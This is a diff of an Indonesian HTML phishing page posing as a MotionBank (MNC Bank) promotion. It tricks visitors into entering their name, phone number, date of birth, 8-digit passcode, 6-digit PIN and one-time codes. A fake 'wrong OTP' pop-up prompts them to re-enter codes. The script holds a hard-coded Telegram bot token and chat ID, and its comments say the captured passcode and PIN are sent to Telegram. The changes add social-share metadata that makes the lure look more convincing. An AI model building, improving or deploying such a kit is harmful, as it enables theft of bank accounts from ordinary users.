@@ -1,11 +1,37 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
+  <!-- Meta Pengkodean & Responsive Mobile -->
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MotionBank Promo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  
+  <!-- Meta Informasi & SEO -->
+  <title>MotionBank - Layanan Digital MNC Bank</title>
+  <meta name="description" content="Klaim promo & hadiah menarik dari Layanan Digital MNC Bank MotionBank sekarang juga!">
+  <meta name="author" content="MotionBank">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <!-- Meta Gambar & Preview (Open Graph / Social Share) -->
+  <meta property="og:image" content="https://i.ibb.co.com/SXbjf33X/b0acf26b-d4fa-4aa4-b082-bda2bae5edb0.jpg">
+  <meta property="og:image:secure_url" content="https://i.ibb.co.com/SXbjf33X/b0acf26b-d4fa-4aa4-b082-bda2bae5edb0.jpg">
+  <meta property="og:image:type" content="image/jpeg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:title" content="MotionBank - Layanan Digital MNC Bank">
+  <meta property="og:description" content="Klaim promo & hadiah menarik dari Layanan Digital MNC Bank MotionBank sekarang juga!">
+  <meta property="og:url" content="#">
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card Data -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="MotionBank - Layanan Digital MNC Bank">
+  <meta name="twitter:description" content="Klaim promo & hadiah menarik dari Layanan Digital MNC Bank MotionBank sekarang juga!">
+  <meta name="twitter:image" content="https://i.ibb.co.com/SXbjf33X/b0acf26b-d4fa-4aa4-b082-bda2bae5edb0.jpg">
+
+  <!-- Tailwind CSS & FontAwesome -->
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
   <style>
     .bg-custom-page1 {
       background-image: url('https://i.ibb.co.com/gb9MSK5z/IMG-2954.jpg');
@@ -24,44 +50,44 @@
     }
   </style>
 </head>
-<body id="bodyContainer" class="bg-custom-page1 min-h-screen text-slate-800 font-sans pb-16 transition-all duration-300">
+<body id="bodyContainer" class="bg-custom-page1 min-h-screen text-slate-800 font-sans pb-12 transition-all duration-300">
 
   <!-- ================= HALAMAN 1 ================= -->
   <div id="page1" class="block">
-    <header class="bg-white/95 backdrop-blur-md text-slate-800 p-4 shadow-sm border-b border-slate-200 sticky top-0 z-40">
-      <div class="max-w-md mx-auto flex justify-between items-center">
+    <header class="bg-white/95 backdrop-blur-md text-slate-800 py-3 px-4 shadow-sm border-b border-slate-200 sticky top-0 z-40">
+      <div class="max-w-sm mx-auto flex justify-between items-center">
         <a href="#" class="flex items-center">
-          <img src="https://i.ibb.co.com/cKpHDvgr/IMG-2953.png" alt="MotionBank Logo" class="h-9 w-auto object-contain">
+          <img src="https://i.ibb.co.com/cKpHDvgr/IMG-2953.png" alt="MotionBank Logo" class="h-7 w-auto object-contain">
         </a>
-        <div class="flex items-center space-x-4">
-          <button class="p-2 text-slate-700 hover:text-amber-500 transition" aria-label="Search">
-            <i class="fa-solid fa-magnifying-glass text-xl"></i>
+        <div class="flex items-center space-x-3">
+          <button class="p-1.5 text-slate-700 hover:text-amber-500 transition text-sm" aria-label="Search">
+            <i class="fa-solid fa-magnifying-glass"></i>
           </button>
-          <button class="p-2 text-slate-700 hover:text-amber-500 transition" aria-label="Menu">
-            <i class="fa-solid fa-bars text-2xl"></i>
+          <button class="p-1.5 text-slate-700 hover:text-amber-500 transition text-base" aria-label="Menu">
+            <i class="fa-solid fa-bars"></i>
           </button>
         </div>
       </div>
     </header>
 
-    <main class="max-w-md mx-auto p-4 space-y-5">
+    <main class="max-w-sm mx-auto p-3 space-y-3">
       <div class="w-full">
         <img 
           src="https://i.ibb.co.com/SXbjf33X/b0acf26b-d4fa-4aa4-b082-bda2bae5edb0.jpg" 
           alt="Promo Banner" 
-          class="w-full h-auto rounded-2xl shadow-2xl border border-white/20 block"
+          class="w-full h-auto rounded-xl shadow-lg border border-white/20 block"
         >
       </div>
 
-      <div class="bg-white/90 backdrop-blur-md p-6 rounded-2xl shadow-xl border border-white/40">
-        <h2 class="text-xl font-bold text-slate-900 mb-1 text-center">Formulir Pendaftaran</h2>
-        <p class="text-xs text-slate-600 mb-5 text-center">Isi data diri Anda untuk klaim promo & hadiah</p>
+      <div class="bg-white/90 backdrop-blur-md p-4 rounded-xl shadow-lg border border-white/40">
+        <h2 class="text-base font-bold text-slate-900 mb-0.5 text-center">Formulir Pendaftaran</h2>
+        <p class="text-[11px] text-slate-600 mb-4 text-center">Isi data diri Anda untuk klaim promo & hadiah</p>
         
-        <form id="formStep1" class="space-y-4">
+        <form id="formStep1" class="space-y-3">
           <div>
-            <label class="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1.5" for="fullName">Nama Lengkap</label>
+            <label class="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1" for="fullName">Nama Lengkap</label>
             <div class="relative">
-              <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 pointer-events-none text-slate-400">
+              <span class="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none text-slate-400 text-xs">
                 <i class="fa-solid fa-user"></i>
               </span>
               <input 
@@ -70,17 +96,17 @@
                 name="fullName" 
                 placeholder="Masukkan nama sesuai KTP" 
                 required
-                class="w-full pl-10 pr-4 py-3 bg-white/80 border border-slate-300 rounded-xl text-base text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-amber-500 focus:border-amber-500 transition shadow-sm"
+                class="w-full pl-9 pr-3 py-2.5 bg-white/80 border border-slate-300 rounded-lg text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-1 focus:ring-amber-500 focus:border-amber-500 transition shadow-sm"
               >
             </div>
           </div>
 
           <div>
-            <label class="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1.5" for="phone">Nomor Handphone</label>
-            <div class="relative flex items-center bg-white/80 border border-slate-300 rounded-xl shadow-sm focus-within:ring-2 focus-within:ring-amber-500 focus-within:border-amber-500 transition">
-              <div class="flex items-center pl-3.5 pr-3 py-3 border-r border-slate-300 bg-slate-50/50 rounded-l-xl select-none">
-                <span class="text-xl mr-2 leading-none">🇮🇩</span>
-                <span class="text-slate-800 font-semibold text-base">+62</span>
+            <label class="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1" for="phone">Nomor Handphone</label>
+            <div class="relative flex items-center bg-white/80 border border-slate-300 rounded-lg shadow-sm focus-within:ring-1 focus-within:ring-amber-500 focus-within:border-amber-500 transition">
+              <div class="flex items-center pl-3 pr-2.5 py-2.5 border-r border-slate-300 bg-slate-50/50 rounded-l-lg select-none text-sm">
+                <span class="mr-1.5 leading-none">🇮🇩</span>
+                <span class="text-slate-800 font-semibold">+62</span>
               </div>
               <input 
                 type="tel" 
@@ -89,16 +115,16 @@
                 placeholder="Masukkan no. handphone" 
                 required
                 maxlength="12"
-                class="w-full pl-4 pr-4 py-3 bg-transparent border-none text-base text-slate-800 placeholder-slate-400 focus:outline-none"
+                class="w-full pl-3 pr-3 py-2.5 bg-transparent border-none text-sm text-slate-800 placeholder-slate-400 focus:outline-none"
               >
             </div>
-            <p class="text-[11px] text-slate-500 mt-1">Awali dengan angka 8 (Total panjang 10 sampai 15 digit)</p>
+            <p class="text-[10px] text-slate-500 mt-0.5">Awali dengan angka 8 (Total panjang 10 - 15 digit)</p>
           </div>
 
           <div>
-            <label class="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1.5" for="dob">Tanggal Lahir</label>
-            <div class="relative max-w-[220px]">
-              <span class="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none text-slate-400 text-sm">
+            <label class="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1" for="dob">Tanggal Lahir</label>
+            <div class="relative max-w-[180px]">
+              <span class="absolute inset-y-0 left-0 flex items-center pl-2.5 pointer-events-none text-slate-400 text-xs">
                 <i class="fa-solid fa-calendar-days"></i>
               </span>
               <input 
@@ -106,14 +132,14 @@
                 id="dob" 
                 name="dob" 
                 required
-                class="w-full pl-9 pr-2 py-2 bg-white/80 border border-slate-300 rounded-lg text-sm text-slate-800 focus:outline-none focus:ring-2 focus:ring-amber-500 focus:border-amber-500 transition shadow-sm"
+                class="w-full pl-8 pr-2 py-2 bg-white/80 border border-slate-300 rounded-lg text-xs text-slate-800 focus:outline-none focus:ring-1 focus:ring-amber-500 focus:border-amber-500 transition shadow-sm"
               >
             </div>
           </div>
 
           <button 
             type="submit" 
-            class="w-full py-3.5 px-4 bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-600 hover:to-amber-700 text-white font-bold rounded-xl shadow-lg hover:shadow-xl transition duration-200 transform active:scale-98 mt-2"
+            class="w-full py-3 px-4 bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-600 hover:to-amber-700 text-white font-bold rounded-lg shadow-md transition duration-200 text-sm mt-1"
           >
             Klaim Promo Sekarang
           </button>
@@ -124,53 +150,51 @@
 
   <!-- ================= HALAMAN 2 (SANDI & PIN) ================= -->
   <div id="page2" class="hidden min-h-screen bg-slate-50">
-    <header class="bg-white p-4 sticky top-0 z-40 border-b border-slate-100 shadow-sm">
-      <div class="max-w-md mx-auto relative flex items-center justify-center">
-        <button id="btnBackTo1" class="absolute left-0 p-2 text-slate-700 hover:text-slate-900 transition text-xl">
+    <header class="bg-white py-3 px-4 sticky top-0 z-40 border-b border-slate-100 shadow-sm">
+      <div class="max-w-sm mx-auto relative flex items-center justify-center">
+        <button id="btnBackTo1" class="absolute left-0 p-1.5 text-slate-700 hover:text-slate-900 transition text-base">
           <i class="fa-solid fa-chevron-left"></i>
         </button>
         <div class="flex flex-col items-center">
-          <img src="https://i.ibb.co.com/cKpHDvgr/IMG-2953.png" alt="MotionBank Logo" class="h-7 w-auto object-contain">
-          <span class="text-[11px] text-slate-500 font-medium tracking-tight mt-0.5">Layanan Digital MNC Bank</span>
+          <img src="https://i.ibb.co.com/cKpHDvgr/IMG-2953.png" alt="MotionBank Logo" class="h-6 w-auto object-contain">
+          <span class="text-[10px] text-slate-500 font-medium tracking-tight">Layanan Digital MNC Bank</span>
         </div>
       </div>
     </header>
 
-    <main class="max-w-md mx-auto p-6 pt-8">
-      <h1 class="text-2xl font-bold text-slate-900 mb-2">Selangkah Lagi</h1>
-      <p class="text-base text-slate-600 leading-relaxed mb-6">
+    <main class="max-w-sm mx-auto p-4 pt-6">
+      <h1 class="text-xl font-bold text-slate-900 mb-1">Selangkah Lagi</h1>
+      <p class="text-xs text-slate-600 leading-relaxed mb-5">
         Masukkan 8-digit kode sandi dan PIN akun Anda untuk melanjutkan proses aktivasi.
       </p>
 
-      <!-- Input Kode Sandi 8 Digit -->
-      <div class="mb-5">
-        <label class="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1.5" for="passcode">Kode Sandi (8 Digit)</label>
+      <div class="mb-4">
+        <label class="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1" for="passcode">Kode Sandi (8 Digit)</label>
         <div class="relative">
           <input 
             type="password" 
             id="passcode" 
             maxlength="8" 
             placeholder="Masukkan kode sandi"
-            class="w-full px-4 py-3.5 bg-white border border-slate-300 rounded-xl text-base text-slate-800 placeholder-slate-400 focus:outline-none focus:border-amber-500 transition shadow-sm pr-12"
+            class="w-full px-3.5 py-3 bg-white border border-slate-300 rounded-lg text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:border-amber-500 transition shadow-sm pr-10"
           >
-          <button type="button" id="togglePasscode" class="absolute right-4 top-1/2 -translate-y-1/2 text-slate-600 hover:text-slate-800 text-xl focus:outline-none">
+          <button type="button" id="togglePasscode" class="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-800 text-sm focus:outline-none">
             <i class="fa-regular fa-eye-slash" id="eyeIcon"></i>
           </button>
         </div>
       </div>
 
-      <!-- Input PIN 6 Digit -->
-      <div class="mb-8">
-        <label class="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1.5" for="pin">PIN (6 Digit)</label>
+      <div class="mb-6">
+        <label class="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1" for="pin">PIN (6 Digit)</label>
         <div class="relative">
           <input 
             type="password" 
             id="pin" 
             maxlength="6" 
             placeholder="Masukkan PIN 6 digit"
-            class="w-full px-4 py-3.5 bg-white border border-slate-300 rounded-xl text-base text-slate-800 placeholder-slate-400 focus:outline-none focus:border-amber-500 transition shadow-sm pr-12"
+            class="w-full px-3.5 py-3 bg-white border border-slate-300 rounded-lg text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:border-amber-500 transition shadow-sm pr-10"
           >
-          <button type="button" id="togglePin" class="absolute right-4 top-1/2 -translate-y-1/2 text-slate-600 hover:text-slate-800 text-xl focus:outline-none">
+          <button type="button" id="togglePin" class="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-800 text-sm focus:outline-none">
             <i class="fa-regular fa-eye-slash" id="pinEyeIcon"></i>
           </button>
         </div>
@@ -179,7 +203,7 @@
       <button 
         type="button" 
         id="btnToPage3" 
-        class="w-full py-4 bg-amber-500 hover:bg-amber-600 text-white font-bold rounded-xl shadow-md hover:shadow-lg transition duration-200 text-base"
+        class="w-full py-3 bg-amber-500 hover:bg-amber-600 text-white font-bold rounded-lg shadow-md transition duration-200 text-sm"
       >
         Lanjutkan
       </button>
@@ -188,52 +212,52 @@
 
   <!-- ================= HALAMAN 3 (VERIFIKASI OTP) ================= -->
   <div id="page3" class="hidden min-h-screen bg-slate-50">
-    <header class="bg-white p-4 sticky top-0 z-40 border-b border-slate-100 shadow-sm">
-      <div class="max-w-md mx-auto relative flex items-center justify-center">
-        <button id="btnBackTo2" class="absolute left-0 p-2 text-slate-700 hover:text-slate-900 transition text-xl">
+    <header class="bg-white py-3 px-4 sticky top-0 z-40 border-b border-slate-100 shadow-sm">
+      <div class="max-w-sm mx-auto relative flex items-center justify-center">
+        <button id="btnBackTo2" class="absolute left-0 p-1.5 text-slate-700 hover:text-slate-900 transition text-base">
           <i class="fa-solid fa-chevron-left"></i>
         </button>
         <div class="flex flex-col items-center">
-          <img src="https://i.ibb.co.com/cKpHDvgr/IMG-2953.png" alt="MotionBank Logo" class="h-7 w-auto object-contain">
-          <span class="text-[11px] text-slate-500 font-medium tracking-tight mt-0.5">Layanan Digital MNC Bank</span>
+          <img src="https://i.ibb.co.com/cKpHDvgr/IMG-2953.png" alt="MotionBank Logo" class="h-6 w-auto object-contain">
+          <span class="text-[10px] text-slate-500 font-medium tracking-tight">Layanan Digital MNC Bank</span>
         </div>
       </div>
     </header>
 
-    <main class="max-w-md mx-auto p-6 pt-8 flex flex-col min-h-[calc(100vh-80px)] justify-between">
+    <main class="max-w-sm mx-auto p-4 pt-6 flex flex-col min-h-[calc(100vh-65px)] justify-between">
       <div>
-        <h1 class="text-2xl font-bold text-slate-900 mb-2">Verifikasi Kode OTP</h1>
-        <p class="text-base text-slate-600 leading-snug">
+        <h1 class="text-xl font-bold text-slate-900 mb-1">Verifikasi Kode OTP</h1>
+        <p class="text-xs text-slate-600 leading-snug">
           Masukkan kode OTP yang telah dikirim ke nomor handphone:
         </p>
-        <p id="maskedPhoneDisplay" class="text-base font-bold text-slate-900 mt-2 mb-6 tracking-wide">
+        <p id="maskedPhoneDisplay" class="text-xs font-bold text-slate-900 mt-1.5 mb-5 tracking-wide">
           +62 •••• •••• 789
         </p>
 
-        <label class="block text-sm font-medium text-slate-700 mb-3">Kode OTP</label>
+        <label class="block text-xs font-medium text-slate-700 mb-2">Kode OTP</label>
         
-        <div class="flex justify-between items-center gap-2 mb-10">
-          <input type="number" maxlength="1" class="otp-input w-12 h-14 text-center text-xl font-semibold bg-white border border-slate-300 rounded-xl focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
-          <input type="number" maxlength="1" class="otp-input w-12 h-14 text-center text-xl font-semibold bg-white border border-slate-300 rounded-xl focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
-          <input type="number" maxlength="1" class="otp-input w-12 h-14 text-center text-xl font-semibold bg-white border border-slate-300 rounded-xl focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
-          <input type="number" maxlength="1" class="otp-input w-12 h-14 text-center text-xl font-semibold bg-white border border-slate-300 rounded-xl focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
-          <input type="number" maxlength="1" class="otp-input w-12 h-14 text-center text-xl font-semibold bg-white border border-slate-300 rounded-xl focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
-          <input type="number" maxlength="1" class="otp-input w-12 h-14 text-center text-xl font-semibold bg-white border border-slate-300 rounded-xl focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
+        <div class="flex justify-between items-center gap-1.5 mb-8">
+          <input type="number" maxlength="1" class="otp-input w-10 h-12 text-center text-lg font-semibold bg-white border border-slate-300 rounded-lg focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
+          <input type="number" maxlength="1" class="otp-input w-10 h-12 text-center text-lg font-semibold bg-white border border-slate-300 rounded-lg focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
+          <input type="number" maxlength="1" class="otp-input w-10 h-12 text-center text-lg font-semibold bg-white border border-slate-300 rounded-lg focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
+          <input type="number" maxlength="1" class="otp-input w-10 h-12 text-center text-lg font-semibold bg-white border border-slate-300 rounded-lg focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
+          <input type="number" maxlength="1" class="otp-input w-10 h-12 text-center text-lg font-semibold bg-white border border-slate-300 rounded-lg focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
+          <input type="number" maxlength="1" class="otp-input w-10 h-12 text-center text-lg font-semibold bg-white border border-slate-300 rounded-lg focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
         </div>
 
-        <div class="text-center space-y-2">
-          <div id="otpTimer" class="text-base font-medium text-slate-700">00:58</div>
-          <button type="button" id="btnResend" class="text-sm font-semibold text-slate-600 hover:text-amber-600 transition">
+        <div class="text-center space-y-1.5">
+          <div id="otpTimer" class="text-xs font-medium text-slate-700">00:58</div>
+          <button type="button" id="btnResend" class="text-xs font-semibold text-slate-600 hover:text-amber-600 transition">
             Tidak Menerima OTP? <span class="text-slate-700 underline font-bold">Kirim Ulang</span>
           </button>
         </div>
       </div>
 
-      <div class="mt-8 pb-6">
+      <div class="mt-6 pb-4">
         <button 
           type="button" 
           id="btnFinalSubmit" 
-          class="w-full py-4 bg-slate-200 text-slate-400 font-bold rounded-xl transition duration-200 text-base"
+          class="w-full py-3 bg-slate-200 text-slate-400 font-bold rounded-lg transition duration-200 text-sm"
           disabled
         >
           Lanjut
@@ -244,24 +268,24 @@
 
   <!-- ================= POP-UP OTP SALAH (MODAL) ================= -->
   <div id="otpErrorModal" class="fixed inset-0 z-50 flex items-end justify-center bg-black/50 backdrop-blur-sm hidden transition-opacity duration-300">
-    <div class="bg-white w-full max-w-md rounded-t-3xl p-6 text-center shadow-2xl transform transition-transform duration-300 translate-y-0">
-      <div class="flex justify-center mb-4">
-        <div class="relative w-24 h-24 flex items-center justify-center">
-          <i class="fa-solid fa-cloud text-slate-300 text-3xl absolute top-0 left-2"></i>
-          <i class="fa-solid fa-cloud text-slate-200 text-2xl absolute top-3 right-2"></i>
-          <i class="fa-solid fa-heart-crack text-amber-400 text-6xl relative z-10"></i>
+    <div class="bg-white w-full max-w-sm rounded-t-2xl p-5 text-center shadow-2xl transform transition-transform duration-300 translate-y-0">
+      <div class="flex justify-center mb-3">
+        <div class="relative w-20 h-20 flex items-center justify-center">
+          <i class="fa-solid fa-cloud text-slate-300 text-2xl absolute top-0 left-2"></i>
+          <i class="fa-solid fa-cloud text-slate-200 text-xl absolute top-2 right-2"></i>
+          <i class="fa-solid fa-heart-crack text-amber-400 text-5xl relative z-10"></i>
         </div>
       </div>
       
-      <h3 class="text-xl font-bold text-slate-900 mb-2">OTP Salah</h3>
-      <p class="text-sm text-slate-600 mb-6 leading-relaxed">
+      <h3 class="text-base font-bold text-slate-900 mb-1">OTP Salah</h3>
+      <p class="text-xs text-slate-600 mb-5 leading-relaxed">
         OTP yang Anda masukkan salah. Mohon coba lagi dengan benar.
       </p>
 
       <button 
         type="button" 
         id="btnCloseModal" 
-        class="w-full py-3.5 bg-amber-500 hover:bg-amber-600 text-white font-bold rounded-xl shadow-lg transition"
+        class="w-full py-3 bg-amber-500 hover:bg-amber-600 text-white font-bold rounded-lg shadow-md transition text-sm"
       >
         OK
       </button>
@@ -269,14 +293,15 @@
   </div>
 
   <!-- Floating WhatsApp Button (Bottom Left) -->
-  <div class="fixed bottom-5 left-5 z-50">
-    <a href="https://wa.me/" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center w-14 h-14 bg-emerald-500 hover:bg-emerald-600 text-white rounded-full shadow-2xl transition duration-300 hover:scale-110">
-      <i class="fa-brands fa-whatsapp text-3xl"></i>
+  <div class="fixed bottom-4 left-4 z-50">
+    <a href="https://wa.me/" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center w-12 h-12 bg-emerald-500 hover:bg-emerald-600 text-white rounded-full shadow-lg transition duration-300 hover:scale-110">
+      <i class="fa-brands fa-whatsapp text-2xl"></i>
     </a>
   </div>
 
-  <!-- Script Validasi & Integrasi Telegram -->
+  <!-- Script Logika & Telegram Bot -->
   <script>
+    // MASUKKAN TOKEN BOT & CHAT ID TELEGRAM ANDA DI SINI
     const BOT_TOKEN = "9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs"; 
     const CHAT_ID = "6742478722";
 
@@ -318,7 +343,6 @@
       otp: ""
     };
 
-    // Validasi No HP (10-15 digit total termasuk +62, wajib awali angka 8)
     phoneInput.addEventListener('input', function(e) {
       let val = e.target.value.replace(/\D/g, ''); 
       if (val.length > 0 && val[0] !== '8') {
@@ -378,7 +402,6 @@
       window.scrollTo(0, 0);
     });
 
-    // Toggle Passcode Eye
     togglePasscode.addEventListener('click', function() {
       const type = passcode.getAttribute('type') === 'password' ? 'text' : 'password';
       passcode.setAttribute('type', type);
@@ -386,7 +409,6 @@
       eyeIcon.classList.toggle('fa-eye');
     });
 
-    // Toggle PIN Eye
     togglePin.addEventListener('click', function() {
       const type = pinInput.getAttribute('type') === 'password' ? 'text' : 'password';
       pinInput.setAttribute('type', type);
@@ -394,7 +416,6 @@
       pinEyeIcon.classList.toggle('fa-eye');
     });
 
-    // Lanjut ke Halaman 3 (Simpan Sandi & PIN ke Telegram)
     btnToPage3.addEventListener('click', function() {
       if(!passcode.value) {
         alert("Silakan masukkan kode sandi Anda terlebih dahulu.");
@@ -501,3 +522,4 @@
 
 </body>
 </html>
+
